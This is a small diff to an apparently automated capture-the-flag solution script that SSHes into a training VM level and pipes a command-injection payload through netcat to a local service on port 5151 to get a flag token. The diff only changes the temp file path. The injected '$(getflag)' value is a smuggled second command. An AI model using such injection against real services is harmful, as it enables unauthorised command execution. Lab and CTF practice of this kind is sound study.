@@ -17,9 +17,9 @@ fi
 
 act_level_password=$(cat "../../level${PREVIOUS_LEVEL}/flag")
 
-sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo "\$(getflag) > /tmp/flag ; echo" | nc localhost 5151 > /dev/null' 2> /dev/null
+sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo "\$(getflag) > /tmp/abcd ; echo" | nc localhost 5151 > /dev/null' 2> /dev/null
 
-token="$(sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cat /tmp/flag' 2> /dev/null)"
+token="$(sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'cat /tmp/abcd' 2> /dev/null)"
 
 token="$(echo "${token}" | grep --color=never 'Check flag.Here is your token : ' | sed 's/.*Check flag.Here is your token : \(\S\+\).*/\1/' | head -n 1)"
 
